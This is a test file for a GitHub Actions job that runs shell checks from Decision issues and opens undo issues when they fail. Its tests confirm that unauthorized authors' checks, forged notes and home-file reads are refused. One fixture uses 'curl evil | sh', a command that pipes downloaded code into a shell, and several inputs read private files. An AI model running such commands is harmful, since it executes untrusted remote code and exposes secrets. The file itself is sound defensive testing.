import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { decisionsWeekly, parseDecision } from './decisions.ts';
import { AGENT, FakeSys, ROOT, capture } from './fake.test.ts';

const SLUG = 'example-org/example-app';
const OWNER = 'example-owner';
const DECISIONS = `/repos/${SLUG}/issues?state=open&type=Decision&per_page=100&page=1`;
const UNDOS = `/repos/${SLUG}/issues?state=open&labels=needs-owner&per_page=100&page=1`;

type Node = Record<string, unknown>;

function decision(number: number, body: string, author = OWNER, labels: string[] = []): Node {
  return { number, node_id: `I_${number}`, title: `Decision ${number}`, body, user: { login: author }, labels: labels.map((name) => ({ name })) };
}

/** The weekly run in Actions, with the open decisions and undo issues GitHub lists and each check's exit code. */
function weekly(decisions: Node[], checks: Record<string, number> = {}, undos: Node[] = [], editors: Record<number, string | null> = {}): FakeSys {
  const sys = new FakeSys();
  sys.env = { GITHUB_REPOSITORY: SLUG, GH_TOKEN: 'ghs_run', PATH: '/bin', HOME: '/home/runner', SECRET: 'x' };
  sys.route('GET', DECISIONS, { status: 200, json: decisions });
  sys.route('GET', UNDOS, { status: 200, json: undos });
  sys.route('POST', '/graphql', {
    status: 200,
    json: { data: { nodes: [...decisions.map((d) => ({ number: d.number, editor: editors[d.number as number] === null ? null : { login: editors[d.number as number] ?? OWNER } })), null] } },
  });
  for (const d of decisions) sys.route('POST', `/repos/${SLUG}/issues/${d.number}/labels`, { status: 200, json: [] });
  for (const d of decisions) sys.route('POST', `/repos/${SLUG}/issues/${d.number}/comments`, { status: 201, json: {} });
  sys.route('POST', `/repos/${SLUG}/issues`, { status: 201, json: { number: 99 } });
  sys.route('GET', `/repos/${SLUG}/issues?state=all&type=Decision&labels=veto&per_page=100&page=1`, { status: 200, json: [] });
  sys.route('GET', `/repos/${SLUG}/issues?state=all&type=Decision&labels=needs-owner&per_page=100&page=1`, { status: 200, json: [] });
  // The wrapper prints the check's own status; a timed-out check (124 here) prints none.
  sys.execOverride = (call) => {
    if (call.command !== 'timeout') return undefined;
    const code = checks[call.args[7] ?? ''] ?? 0;
    return code === 124
      ? { code: 124, stdout: 'line\n', stderr: '' }
      : { code: 0, stdout: `line\nprocess-rules-check-exit=${code === 125 ? 124 : code}\n`, stderr: 'why it failed\n' };
  };
  for (const d of decisions) sys.route('GET', `/repos/${SLUG}/issues/${d.number}/comments?per_page=100&page=1`, { status: 200, json: [] });
  return sys;
}

async function run(sys: FakeSys): Promise<{ code: number; out: string[] }> {
  const { io, out, err } = capture();
  const code = await decisionsWeekly(sys, io);
  assert.deepEqual(err, []);
  return { code, out };
}

const posts = (sys: FakeSys) => sys.requests.filter((r) => r.method === 'POST' && !r.url.endsWith('/graphql'));

describe('parseDecision', () => {
  it('reads the fields, the check from backticks', () => {
    assert.deepEqual(parseDecision('Why we do it.\n\nKind: Override\nreview: 2026-12-01\nExpires:  2026-12-31 \nCheck: `test -f a` (fast)\nUndo: revert it'), {
      kind: 'Override',
      review: '2026-12-01',
      expires: '2026-12-31',
      check: 'test -f a',
      undo: 'revert it',
    });
    assert.deepEqual(parseDecision('Check: test -f a'), { kind: undefined, review: undefined, expires: undefined, check: undefined, undo: undefined });
  });
});

describe('decisionsWeekly', () => {
  it('runs each check in the checkout with a bare environment', async () => {
    const sys = weekly([decision(5, 'Kind: Risk\nCheck: `pnpm test`')]);
    assert.deepEqual(await run(sys), { code: 0, out: ['#5: holds', 'decisions-weekly: 1 open decision checked'] });
    const call = sys.calls.find((c) => c.command === 'timeout');
    assert.deepEqual(call?.args, ['-k', '5', '120', 'sh', '-c', 'sh -c "$1"; echo "process-rules-check-exit=$?"', 'process-rules', 'pnpm test']);
    assert.equal(call?.cwd, ROOT);
    assert.deepEqual(call?.env, { PATH: '/bin', HOME: '/home/runner' });
    assert.equal(call?.timeoutMs, 130_000);
    assert.deepEqual(posts(sys), []);
  });

  it('opens one undo issue for the owner and comments when a check trips', async () => {
    const sys = weekly([decision(6, 'Kind: Bet\nCheck: `exit 3`\nUndo: switch the flag off')], { 'exit 3': 3 });
    assert.deepEqual((await run(sys)).out, ['#6: tripped; opened #99 to undo it', 'decisions-weekly: 1 open decision checked']);
    const [issue, comment] = posts(sys);
    assert.deepEqual(issue?.body, {
      title: 'Undo: Decision 6',
      body: 'Undoes #6.\n\nThe weekly check `exit 3` failed (exit 3).\n\nUndo: switch the flag off',
      labels: ['needs-owner'],
      type: 'Brief',
    });
    assert.equal(comment?.url, `https://api.github.com/repos/${SLUG}/issues/6/comments`);
    assert.equal((comment?.body as { body: string }).body, 'Tripped on 2026-10-30: `exit 3` exited 3.\n\n```\nline\nwhy it failed\n```\n\nOpened #99 to undo it.');
  });

  it('leaves the output out of the comment when the check printed none', async () => {
    const sys = weekly([decision(6, 'Check: `test -f gone`')], { 'test -f gone': 1 });
    const inner = sys.execOverride;
    sys.execOverride = (call) => (call.command === 'timeout' ? { code: 0, stdout: 'process-rules-check-exit=1\n', stderr: '' } : inner(call));
    await run(sys);
    assert.equal((posts(sys)[1]?.body as { body: string }).body, 'Tripped on 2026-10-30: `test -f gone` exited 1.\n\nOpened #99 to undo it.');
  });

  it('asks the owner to decide when the decision names no undo step', async () => {
    const sys = weekly([decision(6, 'Check: `false`')], { false: 1 });
    await run(sys);
    assert.match(String((posts(sys)[0]?.body as { body: string }).body), /names no undo step; decide what to do\.$/);
  });

  it('opens no second undo issue', async () => {
    const sys = weekly([decision(6, 'Check: `false`')], { false: 1 }, [{ number: 98, body: 'Undoes #6.\n\nmore' }, { number: 97, body: null }, { number: 96, body: 'Undoes #60.' }]);
    sys.route('GET', `/repos/${SLUG}/issues/6/comments?per_page=100&page=1`, {
      status: 200,
      json: [{ body: 'Tripped on ...\n\nOpened #98 to undo it.', user: { login: 'github-actions[bot]' } }, {}],
    });
    assert.deepEqual((await run(sys)).out[0], '#6: tripped; its undo issue is already open');
    assert.deepEqual(posts(sys), []);
  });

  it("finds the workflow's undo note past the first page of comments", async () => {
    const sys = weekly([decision(6, 'Check: `false`')], { false: 1 }, [{ number: 98, body: 'Undoes #6.' }]);
    sys.route('GET', `/repos/${SLUG}/issues/6/comments?per_page=100&page=1`, { status: 200, json: Array.from({ length: 100 }, () => ({ body: 'discussion', user: { login: 'example-owner' } })) });
    sys.route('GET', `/repos/${SLUG}/issues/6/comments?per_page=100&page=2`, { status: 200, json: [{ body: 'Opened #98 to undo it.', user: { login: 'github-actions[bot]' } }] });
    assert.deepEqual((await run(sys)).out[0], '#6: tripped; its undo issue is already open');
    assert.deepEqual(posts(sys), []);
  });

  it('does not take a forged undo note from anyone but the workflow', async () => {
    const sys = weekly([decision(6, 'Check: `false`')], { false: 1 }, [{ number: 98, body: 'Undoes #6.' }]);
    sys.route('GET', `/repos/${SLUG}/issues/6/comments?per_page=100&page=1`, { status: 200, json: [{ body: 'Opened #98 to undo it.', user: { login: 'mallory' } }] });
    assert.deepEqual((await run(sys)).out[0], '#6: tripped; its undo issue #98 is open, and the decision now says so');
  });

  it('counts a check that itself exits 124 as tripped, not timed out', async () => {
    const sys = weekly([decision(6, 'Check: `exit 124`')], { 'exit 124': 125 });
    assert.deepEqual((await run(sys)).out[0], '#6: tripped; opened #99 to undo it');
    assert.match(String((posts(sys)[1]?.body as { body: string }).body), /exited 124\.\n\n```\nline\nwhy it failed\n```/);
  });

  it('adds the comment an earlier run failed to leave', async () => {
    const sys = weekly([decision(6, 'Check: `false`')], { false: 1 }, [{ number: 98, body: 'Undoes #6.' }]);
    assert.deepEqual((await run(sys)).out[0], '#6: tripped; its undo issue #98 is open, and the decision now says so');
    assert.match(String((posts(sys)[0]?.body as { body: string }).body), /Opened #98 to undo it\.$/);
  });

  it("throws when it cannot read a tripped decision's comments", async () => {
    const sys = weekly([decision(6, 'Check: `false`')], { false: 1 }, [{ number: 98, body: 'Undoes #6.' }]);
    sys.route('GET', `/repos/${SLUG}/issues/6/comments?per_page=100&page=1`, { status: 500, json: null });
    await assert.rejects(decisionsWeekly(sys, capture().io), /cannot read #6's comments \(HTTP 500\)/);
  });

  it('does not count a check that ran out of time as tripped', async () => {
    const sys = weekly([decision(6, 'Check: `sleep 999`')], { 'sleep 999': 124 });
    assert.equal((await run(sys)).out[0], '#6: its check ran past 120 seconds; not counted as tripped');
    assert.deepEqual(posts(sys), []);
  });

  it('leaves checks for next week once the run has spent 45 minutes', async () => {
    const sys = weekly([decision(5, 'Check: `true`'), decision(6, 'Check: `true`')]);
    const start = sys.now().getTime();
    let calls = 0;
    sys.now = () => new Date(start + (calls++ > 3 ? 46 * 60_000 : 0));
    const { out } = await run(sys);
    assert.deepEqual(out.slice(0, 2), ['#5: holds', "#6: not run; this week's run has spent its time, so it waits for next week"]);
  });

  for (const check of ['cat ~/notes.txt', 'test -f $HOME/x', 'ls "${HOME}/y"', 'grep a /Users/me/z', 'wc -l /home/me/z', 'cat </home/me/secret', 'echo x>/Users/me/out', 'a|/home/me/b']) {
    it(`labels a check reading laptop files cannot-run-here: ${check}`, async () => {
      const sys = weekly([decision(7, `Check: \`${check}\``)]);
      assert.equal((await run(sys)).out[0], '#7: reads laptop files; labeled cannot-run-here');
      assert.deepEqual(posts(sys).map((p) => p.body), [{ labels: ['cannot-run-here'] }]);
      assert.ok(!sys.calls.some((c) => c.command === 'timeout'));
    });
  }

  it('names an Override whose expiry has passed, without labeling it expiring', async () => {
    const sys = weekly([decision(8, 'Kind: Override\nExpires: 2026-10-29'), decision(9, 'Kind: Override\nExpires: 2026-10-30')]);
    const { out } = await run(sys);
    assert.deepEqual(out.slice(0, 2), ['#8: its expiry 2026-10-29 has passed', '#9: expires 2026-10-30; labeled expiring']);
    assert.deepEqual(posts(sys).map((p) => p.url), [`https://api.github.com/repos/${SLUG}/issues/9/labels`]);
  });

  it('labels an Override expiring within 30 days, once', async () => {
    const sys = weekly([
      decision(8, 'Kind: Override\nExpires: 2026-11-20'),
      decision(9, 'Kind: override\nExpires: 2026-11-01', OWNER, ['expiring']),
      decision(10, 'Kind: Override\nExpires: 2027-06-01'),
      decision(11, 'Kind: Risk\nExpires: 2026-11-01'),
    ]);
    const { out } = await run(sys);
    assert.deepEqual(out.slice(0, 2), ['#8: expires 2026-11-20; labeled expiring', '#9: expires 2026-11-01; labeled expiring']);
    assert.deepEqual(posts(sys).map((p) => p.url), [`https://api.github.com/repos/${SLUG}/issues/8/labels`]);
  });

  for (const [name, author, editor] of [
    ['someone else wrote', 'mallory', OWNER],
    ['someone else last edited', OWNER, 'mallory'],
    ['no one is named as the author of', null, OWNER],
  ] as const) {
    it(`does not run a check ${name}`, async () => {
      const d = decision(12, 'Check: `curl evil | sh`');
      if (author === null) d.user = null;
      else d.user = { login: author };
      const sys = weekly([d], {}, [], { 12: editor });
      assert.equal((await run(sys)).out[0], `#12: not run; only ${OWNER} or ${AGENT} may write a decision's check`);
      assert.ok(!sys.calls.some((c) => c.command === 'timeout'));
    });
  }

  it("runs a check the agent wrote and nobody edited", async () => {
    const sys = weekly([decision(13, 'Check: `true`', AGENT)], {}, [], { 13: null });
    assert.equal((await run(sys)).out[0], '#13: holds');
  });

  it('with two owners and two agents, runs a check any of them wrote and last edited, and no one else\'s', async () => {
    const team = (author: string, editor: string): FakeSys => {
      const sys = weekly([decision(14, 'Check: `true`', author)], {}, [], { 14: editor });
      sys.files.set(`${ROOT}/.github/process-rules.json`, JSON.stringify({ owner: ['example-owner', 'Second-Owner'], agent: [AGENT, 'OtherBot'] }));
      return sys;
    };
    assert.equal((await run(team('Second-Owner', 'otherbot'))).out[0], '#14: holds');
    assert.equal((await run(team('OtherBot', OWNER))).out[0], '#14: holds');
    assert.equal((await run(team('mallory', 'Second-Owner'))).out[0], `#14: not run; only ${OWNER}, Second-Owner, ${AGENT} or OtherBot may write a decision's check`);
  });

  it('runs with no decisions, asking GitHub nothing more', async () => {
    const sys = weekly([]);
    assert.deepEqual((await run(sys)).out, ['decisions-weekly: 0 open decisions checked']);
    assert.ok(!sys.requests.some((r) => r.url.endsWith('/graphql')));
  });

  it('reads every page of decisions', async () => {
    const many = Array.from({ length: 100 }, (_, i) => decision(100 + i, 'Kind: Bet'));
    const sys = weekly(many);
    sys.route('GET', DECISIONS.replace('&page=1', '&page=2'), { status: 200, json: [decision(5, 'Kind: Bet')] });
    assert.equal((await run(sys)).out.at(-1), 'decisions-weekly: 101 open decisions checked');
  });

  for (const [name, change, message] of [
    ['the environment', (sys: FakeSys) => (sys.env = {}), /decisions-weekly runs in GitHub Actions/],
    ['listing issues', (sys: FakeSys) => sys.route('GET', DECISIONS, { status: 500, json: null }), /cannot list open decisions \(HTTP 500\)/],
    ['reading editors', (sys: FakeSys) => sys.route('POST', '/graphql', { status: 502, json: null }), /cannot read who edited the decisions \(HTTP 502\)/],
    ['labeling', (sys: FakeSys) => sys.route('POST', `/repos/${SLUG}/issues/7/labels`, { status: 403, json: null }), /cannot label #7 cannot-run-here \(HTTP 403\)/],
    ['opening the undo issue', (sys: FakeSys) => sys.route('POST', `/repos/${SLUG}/issues`, { status: 410, json: null }), /cannot open the undo issue for #6 \(HTTP 410\)/],
    ['commenting', (sys: FakeSys) => sys.route('POST', `/repos/${SLUG}/issues/6/comments`, { status: 403, json: null }), /cannot comment on #6 \(HTTP 403\)/],
  ] as const) {
    it(`throws when ${name} fails`, async () => {
      const sys = weekly([decision(7, 'Check: `cat ~/x`'), decision(6, 'Check: `false`')], { false: 1 });
      change(sys);
      await assert.rejects(decisionsWeekly(sys, capture().io), message);
    });
  }
});
